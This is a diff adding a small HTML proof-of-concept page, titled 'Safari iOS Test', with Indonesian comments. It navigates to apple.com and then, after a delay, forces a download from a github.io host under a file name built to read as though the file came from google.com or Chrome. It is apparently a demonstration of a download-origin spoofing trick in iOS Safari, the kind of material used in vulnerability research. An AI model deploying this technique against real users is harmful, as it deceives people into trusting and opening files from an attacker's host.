@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Safari iOS Test</title>
+</head>
+
+<body>
+
+<button onclick="poc()">TEST</button>
+
+<script>
+function poc() {
+
+  // 1. Coba pindah ke apple.com dulu
+  setTimeout(() => {
+    window.location.href = "https://apple.com";
+  }, 0);
+
+  // 2. Coba trigger download setelahnya
+  setTimeout(() => {
+    const a = document.createElement("a");
+    a.href = 'https://ecdnts-del.github.io/test-apk/on "google.com" file.zip also chrome.zip';
+    a.download = 'on "google.com" file.zip also chrome.zip';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 2500);
+
+}
+</script>
+
+</body>
+</html>
